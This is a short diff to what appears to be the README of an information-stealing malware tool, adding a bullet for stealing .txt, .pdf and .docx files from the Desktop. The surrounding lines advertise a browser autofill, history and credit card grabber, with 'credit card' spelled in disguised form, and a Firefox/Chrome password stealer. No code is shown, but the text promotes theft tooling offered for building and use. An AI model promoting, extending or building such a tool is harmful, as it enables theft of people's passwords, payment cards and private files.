@@ -99,6 +99,8 @@ To Compile, launch this and fill out the form :
 
 
 
+💚 Steal .txt, .pdf, .docx files in Desktop directory
+
 💚 Browser autofill, history, C r 3 d 1 t c 4 r d grabber
 
 💚 Browser Password Stealer (Firefox/Chrome/Chromium)
